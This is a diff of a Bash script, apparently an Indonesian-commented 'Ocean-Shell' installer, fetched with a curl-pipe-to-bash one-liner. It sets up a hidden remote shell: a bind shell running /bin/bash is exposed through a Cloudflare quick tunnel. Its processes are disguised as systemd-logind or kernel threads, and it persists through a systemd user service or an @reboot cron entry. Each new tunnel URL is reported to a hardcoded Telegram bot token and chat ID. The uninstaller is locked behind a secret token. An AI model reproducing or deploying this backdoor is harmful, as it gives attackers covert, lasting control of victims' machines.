@@ -1,19 +1,17 @@
 #!/usr/bin/env bash
-# Cloudflare Tunnel Reverse Shell (persistent) + Telegram notifikasi
+# Cloudflare Tunnel Reverse Shell (seperti gsocket) + Telegram notifikasi
 # Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
-# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
-
-set -euo pipefail
+# Uninstall: CF_UNINSTALL=<token> bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
 
 # ========== KONFIGURASI ==========
 : "${HOME:=/tmp}"
 : "${USER:=$(whoami 2>/dev/null || echo unknown)}"
 : "${UID:=$(id -u 2>/dev/null || echo 0)}"
 
-# Nama binary dan direktori (usahakan sembunyi)
 BIN_HIDDEN_NAME="systemd-logind"
 CONFIG_DIR=".config/dbus"
 URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
+TMPDIR="/tmp/.cf-${UID}"
 PORT=$((RANDOM % 40000 + 10000))
 
 # Daftar nama proses kernel untuk menyembunyikan proses
@@ -23,34 +21,43 @@ KERNEL_PROC_NAMES=(
 )
 PROC_HIDDEN_NAME="${KERNEL_PROC_NAMES[$((RANDOM % ${#KERNEL_PROC_NAMES[@]}))]}"
 
-# Telegram (isi sesuai)
+# ========== TELEGRAM NOTIFICATION ==========
 TELEGRAM_BOT_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
 TELEGRAM_CHAT_ID="6223261018"
 
-# ========== FUNGSI ==========
-print_step() { printf "%-50s" "$1"; }
+mkdir -p "$TMPDIR" 2>/dev/null || true
+set -euo pipefail
+
+# ========== FUNGSI OUTPUT ==========
+print_step() {
+    printf "%-50s" "$1"
+}
 finish_ok()     { echo "[OK]"; }
 finish_skip()   { echo "[SKIPPING]"; }
 finish_failed() { echo "[FAILED]"; exit 1; }
+
+# ========== FUNGSI UTIL ==========
 error() { echo -e "\033[1;31m$*\033[0m" >&2; }
 info()  { echo -e "\033[1;32m$*\033[0m" >&2; }
 warn()  { echo -e "\033[1;33m$*\033[0m" >&2; }
 
-# Kirim Telegram dengan fallback curl/wget
+cleanup() {
+    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR" 2>/dev/null || true
+}
+trap cleanup EXIT
+
+# ========== KIRIM PESAN TELEGRAM ==========
 send_telegram() {
     local message="$1"
     if [[ -n "$TELEGRAM_BOT_TOKEN" && "$TELEGRAM_BOT_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "$TELEGRAM_CHAT_ID" ]]; then
-        local url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
-        local data="chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=HTML"
-        if command -v curl >/dev/null; then
-            curl -s -X POST "$url" -d "$data" >/dev/null 2>&1 &
-        elif command -v wget >/dev/null; then
-            wget -q --post-data "$data" "$url" >/dev/null 2>&1 &
-        fi
+        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="$TELEGRAM_CHAT_ID" \
+            -d text="$message" \
+            -d parse_mode="HTML" >/dev/null 2>&1 &
     fi
 }
 
-# Deteksi arsitektur
+# ========== DETEKSI ARSITEKTUR ==========
 detect_arch() {
     local arch=$(uname -m)
     local os=$(uname -s | tr '[:upper:]' '[:lower:]')
@@ -69,7 +76,7 @@ detect_arch() {
     echo "${os}-${arch}"
 }
 
-# Download cloudflared
+# ========== DOWNLOAD CLOUDFLARED ==========
 download_cloudflared() {
     local arch="$1"
     local url="${URL_BASE}/cloudflared-${arch}"
@@ -85,7 +92,7 @@ download_cloudflared() {
     echo "$out"
 }
 
-# Mulai bindshell (local)
+# ========== BIND SHELL (LISTEN LOCALHOST) ==========
 start_bindshell() {
     local port="$1"
     local bind_cmd
@@ -102,7 +109,7 @@ start_bindshell() {
     echo $!
 }
 
-# Mulai tunnel langsung (untuk sesi pertama)
+# ========== START TUNNEL (langsung, tanpa monitor) ==========
 start_tunnel_direct() {
     local port="$1"
     local bin="$2"
@@ -110,61 +117,41 @@ start_tunnel_direct() {
     echo $!
 }
 
-# Buat skrip persistence (bind shell + tunnel) yang akan dijalankan otomatis
+# ========== PERSISTENCE SCRIPT (dengan monitoring URL dan Telegram) ==========
 create_persistence_script() {
     local bin_path="$1"
     local port="$2"
-    local script_path="$3"
-    local telegram_token="$4"
-    local telegram_chat="$5"
-    local proc_name="$6"
+    local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
+    local telegram_token="$3"
+    local telegram_chat="$4"
+    mkdir -p "${HOME}/.${CONFIG_DIR}" 2>/dev/null || true
     cat > "$script_path" <<EOF
 #!/bin/bash
-# Persistence script (bind shell + tunnel)
+# Persistence script for Cloudflare Tunnel (hidden)
 BIN="$bin_path"
 PORT=$port
 TMPDIR="$TMPDIR"
 TELEGRAM_TOKEN="$telegram_token"
 TELEGRAM_CHAT="$telegram_chat"
-PROC_NAME="$proc_name"
+PROC_NAME="$PROC_HIDDEN_NAME"
 URL_SENT_FILE="\$TMPDIR/url_sent"
 
 send_telegram() {
     if [[ -n "\$TELEGRAM_TOKEN" && "\$TELEGRAM_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "\$TELEGRAM_CHAT" ]]; then
-        local url="https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage"
-        local data="chat_id=\${TELEGRAM_CHAT}&text=\$1&parse_mode=HTML"
-        if command -v curl >/dev/null; then
-            curl -s -X POST "\$url" -d "\$data" >/dev/null 2>&1 &
-        elif command -v wget >/dev/null; then
-            wget -q --post-data "\$data" "\$url" >/dev/null 2>&1 &
-        fi
+        curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage" \\
+            -d chat_id="\$TELEGRAM_CHAT" \\
+            -d text="\$1" \\
+            -d parse_mode="HTML" >/dev/null 2>&1 &
     fi
 }
 
-# Jalankan bindshell dengan restart loop
-run_bindshell() {
-    while true; do
-        if command -v socat >/dev/null; then
-            exec -a "\$PROC_NAME" socat TCP-LISTEN:\${PORT},bind=127.0.0.1,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
-        elif command -v ncat >/dev/null; then
-            exec -a "\$PROC_NAME" ncat -lvvk \${PORT} -e /bin/bash --allow 127.0.0.1
-        elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
-            exec -a "\$PROC_NAME" nc -l -p \${PORT} -s 127.0.0.1 -e /bin/bash
-        else
-            exec -a "\$PROC_NAME" bash -c "while true; do nc -l -p \${PORT} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done"
-        fi
-        sleep 5
-    done
-}
-
-run_bindshell &
-
-# Tunnel loop dengan monitoring URL
 while true; do
+    # Jalankan tunnel, arahkan stdout+stderr ke log
     exec -a "\$PROC_NAME" "\$BIN" tunnel --url "tcp://127.0.0.1:\$PORT" 2>&1 | while IFS= read -r line; do
         echo "\$line" >> "\$TMPDIR/cloudflared.log"
         if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
             url="\${BASH_REMATCH[0]}"
+            # Cek apakah URL sudah pernah dikirim
             if [[ ! -f "\$URL_SENT_FILE" ]] || ! grep -q "\$url" "\$URL_SENT_FILE"; then
                 echo "\$url" >> "\$URL_SENT_FILE"
                 msg="<b>New Tunnel URL</b>\n\$url\n\nUse: cloudflared access tcp --hostname \$url --url localhost:4444 && nc localhost 4444"
@@ -179,11 +166,12 @@ EOF
     echo "$script_path"
 }
 
-# Install persistence (systemd user atau crontab)
+# ========== INSTALL PERSISTENCE (systemd/cron) ==========
 install_persistence() {
     local script_path="$1"
-    local service_name="systemd-logind"
-    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null; then
+    local service_name="cf-tunnel"
+    # Cek apakah systemd user tersedia (dengan silent)
+    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null 2>&1; then
         mkdir -p "${HOME}/.config/systemd/user"
         cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
 [Unit]
@@ -200,9 +188,9 @@ StandardError=null
 [Install]
 WantedBy=default.target
 EOF
-        systemctl --user daemon-reload
-        systemctl --user enable "$service_name"
-        systemctl --user start "$service_name"
+        systemctl --user daemon-reload 2>/dev/null || true
+        systemctl --user enable "$service_name" 2>/dev/null || true
+        systemctl --user start "$service_name" 2>/dev/null || true
         return 0
     elif command -v crontab >/dev/null; then
         (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
@@ -212,19 +200,50 @@ EOF
     fi
 }
 
-# Uninstall
+# ========== DETEKSI INSTALASI SUDAH ADA ==========
+check_existing_installation() {
+    local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
+    if [[ -f "$token_file" ]]; then
+        warn "Installation already detected. If you want to reinstall, first uninstall with the token."
+        exit 1
+    fi
+    # Tidak mengecek proses karena bisa false positive dengan proses kernel asli
+}
+
+# ========== UNINSTALL (dengan token) ==========
 uninstall() {
+    # Baca token yang tersimpan
+    local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
+    if [[ ! -f "$token_file" ]]; then
+        echo "No installation found or token missing."
+        exit 1
+    fi
+    local stored_token=$(cat "$token_file")
+    # Cek variabel lingkungan CF_UNINSTALL
+    if [[ -z "${CF_UNINSTALL:-}" ]] || [[ "$CF_UNINSTALL" != "$stored_token" ]]; then
+        echo "Invalid uninstall token. Use CF_UNINSTALL=<token> bash -c ..."
+        exit 1
+    fi
+
     print_step "Removing installed files..."
-    pkill -f "$PROC_HIDDEN_NAME" 2>/dev/null || true
-    pkill -f "systemd-logind-helper" 2>/dev/null || true
-    crontab -l 2>/dev/null | grep -v "systemd-logind-helper" | crontab - 2>/dev/null || true
+    # Baca file konfigurasi PID jika ada
+    local conf_file="${HOME}/.${CONFIG_DIR}/tunnel.conf"
+    if [[ -f "$conf_file" ]]; then
+        source "$conf_file"
+        [[ -n "${TUNNEL_PID:-}" ]] && kill -9 "$TUNNEL_PID" 2>/dev/null || true
+        [[ -n "${BIND_PID:-}" ]] && kill -9 "$BIND_PID" 2>/dev/null || true
+        [[ -n "${PROC_NAME:-}" ]] && pkill -f "$PROC_NAME" 2>/dev/null || true
+    fi
+    pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
+    pkill -f "cf_tunnel.sh" 2>/dev/null || true
+    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
     if command -v systemctl >/dev/null; then
-        systemctl --user stop systemd-logind.service 2>/dev/null || true
-        systemctl --user disable systemd-logind.service 2>/dev/null || true
-        rm -f "${HOME}/.config/systemd/user/systemd-logind.service"
+        systemctl --user stop cf-tunnel.service 2>/dev/null || true
+        systemctl --user disable cf-tunnel.service 2>/dev/null || true
+        rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
         systemctl --user daemon-reload 2>/dev/null || true
     fi
-    rm -rf "${INSTALL_DIR:-$HOME/.config/dbus}"
+    rm -rf "${HOME}/.${CONFIG_DIR}"
     rm -rf "$TMPDIR"
     finish_ok
     echo "--> Uninstall complete."
@@ -232,87 +251,127 @@ uninstall() {
 }
 
 # ========== MAIN ==========
-[[ -n "${GS_UNDO:-}" ]] && uninstall
+# Cek uninstall dengan token
+[[ -n "${CF_UNINSTALL:-}" ]] && uninstall
 
-# Tentukan TMPDIR (bersihkan jika ada)
-TMPDIR="/tmp/.cf-${UID}"
+# Cek apakah instalasi sudah ada (hanya jika tidak dalam mode uninstall)
+check_existing_installation
+
 rm -rf "$TMPDIR" 2>/dev/null || true
 mkdir -p "$TMPDIR"
 
-# Tentukan direktori instalasi (prioritas: HOME/.config/dbus, fallback ke /tmp jika gagal)
-INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
-if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
-    warn "Cannot create $INSTALL_DIR, using /tmp/.cf-${UID}/install"
-    INSTALL_DIR="/tmp/.cf-${UID}/install"
-    mkdir -p "$INSTALL_DIR"
-fi
-
-# Download binary
+# --- Step 1: Download binaries ---
 print_step "Downloading binaries..."
 arch=$(detect_arch)
 cf_bin=$(download_cloudflared "$arch") || finish_failed
 finish_ok
 
+# --- Step 2: Unpacking binaries ---
+print_step "Unpacking binaries..."
+sleep 0.1
+finish_ok
+
+# --- Step 3: Copying binaries dengan fallback ---
 print_step "Copying binaries..."
-cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null || finish_failed
+INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
+USE_TMP=0
+if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
+    USE_TMP=1
+elif ! cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null; then
+    USE_TMP=1
+fi
+
+if [[ $USE_TMP -eq 1 ]]; then
+    warn "Cannot use $INSTALL_DIR, using /tmp instead"
+    INSTALL_DIR="/tmp/.${CONFIG_DIR}-${UID}"
+    mkdir -p "$INSTALL_DIR" || finish_failed
+    cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null || {
+        error "Failed to copy binary to $INSTALL_DIR"
+        finish_failed
+    }
+fi
+
 chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
 cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"
 finish_ok
 
+# --- Step 4: Testing binaries ---
 print_step "Testing binaries..."
-if ! "$cf_bin" --version &>/dev/null; then finish_failed; fi
+if ! "$cf_bin" --version &>/dev/null; then
+    finish_failed
+fi
 finish_ok
 
-print_step "Testing network connectivity..."
+# --- Step 5: Testing Global Socket Relay Network ---
+print_step "Testing Global Socket Relay Network..."
 if curl -fsSL -m 5 https://cloudflare.com &>/dev/null || wget -q -T 5 --spider https://cloudflare.com &>/dev/null; then
     finish_ok
 else
-    warn "No internet? Continuing..."
+    warn "No internet connectivity? Continuing anyway..."
     finish_skip
 fi
 
-# Sisa langkah (skip ~/.bashrc, ~/.profile, webhooks)
-print_step "Installing access via ~/.bashrc..."; finish_skip
-print_step "Installing access via ~/.profile..."; finish_skip
-print_step "Executing webhooks..."; finish_skip
+# --- Step 6 & 7: Installing access via ~/.bashrc & ~/.profile (dummy) ---
+print_step "Installing access via ~/.bashrc..."
+finish_skip
+print_step "Installing access via ~/.profile..."
+finish_skip
 
-echo "--> To uninstall use GS_UNDO=1 bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)\""
-echo "--> To connect use: cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"
+# --- Step 8: Executing webhooks ---
+print_step "Executing webhooks..."
+finish_skip
 
-# Jalankan sementara
-print_step "Starting temporary tunnel..."
+# --- Buat token uninstall ---
+UNINSTALL_TOKEN=$(openssl rand -hex 8 2>/dev/null || head -c 8 /dev/urandom | xxd -p 2>/dev/null || echo "default")
+echo "$UNINSTALL_TOKEN" > "${INSTALL_DIR}/.uninstall_token"
+chmod 600 "${INSTALL_DIR}/.uninstall_token"
+
+# --- Informasi uninstall ---
+echo "--> To uninstall, use: CF_UNINSTALL=$UNINSTALL_TOKEN bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)\""
+echo "--> To connect use one of the following:"
+echo "--> cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"
+
+# --- Step 9: Starting hidden process (temporary) ---
+print_step "Starting 'defunct' as hidden process '$PROC_HIDDEN_NAME'..."
+
+# Start bindshell
 bind_pid=$(start_bindshell "$PORT")
+# Start tunnel (langsung)
 tunnel_pid=$(start_tunnel_direct "$PORT" "$cf_bin")
-cat > "$INSTALL_DIR/tunnel.conf" <<EOF
+# Simpan PID untuk uninstall
+cat > "${INSTALL_DIR}/tunnel.conf" <<EOF
 BIND_PID=$bind_pid
 TUNNEL_PID=$tunnel_pid
 PROC_NAME=$PROC_HIDDEN_NAME
 PORT=$PORT
 EOF
 
+# Tunggu URL awal
 sleep 5
+# Cek log untuk URL
 if [[ -f "$TMPDIR/cloudflared.log" ]]; then
     url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TMPDIR/cloudflared.log" | head -1)
     if [[ -n "$url" ]]; then
         echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m"
+        echo "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
+        # Kirim via Telegram
         send_telegram "<b>Initial Tunnel URL</b>\n$url"
     else
-        warn "URL not detected yet. Check $TMPDIR/cloudflared.log"
+        warn "Tunnel URL not detected yet. Check $TMPDIR/cloudflared.log"
     fi
 fi
 finish_ok
 
-# Install persistence
+# --- Persistence dengan Telegram ---
 if [[ -z "${GS_NOINST:-}" ]]; then
-    # Buat skrip persistence di tempat yang aman (gunakan INSTALL_DIR atau HOME/.config/dbus)
-    PERSIST_SCRIPT="${INSTALL_DIR}/systemd-logind-helper"
-    create_persistence_script "$cf_bin" "$PORT" "$PERSIST_SCRIPT" "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID" "$PROC_HIDDEN_NAME"
-    if install_persistence "$PERSIST_SCRIPT"; then
-        info "Persistence installed (bind shell + tunnel will auto-start after reboot)."
+    persistence_script=$(create_persistence_script "$cf_bin" "$PORT" "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID")
+    if install_persistence "$persistence_script"; then
+        info "Persistence installed (will send new URLs via Telegram after reboot)."
     else
         warn "Persistence not installed (no systemd/cron). Tunnel will not survive reboot."
     fi
 fi
 
 echo "--> Join us on Telegram - https://t.me/thcorg"
-info "Done. Use GS_UNDO=1 to uninstall."
+echo
+info "Done. Use CF_UNINSTALL=$UNINSTALL_TOKEN to uninstall."
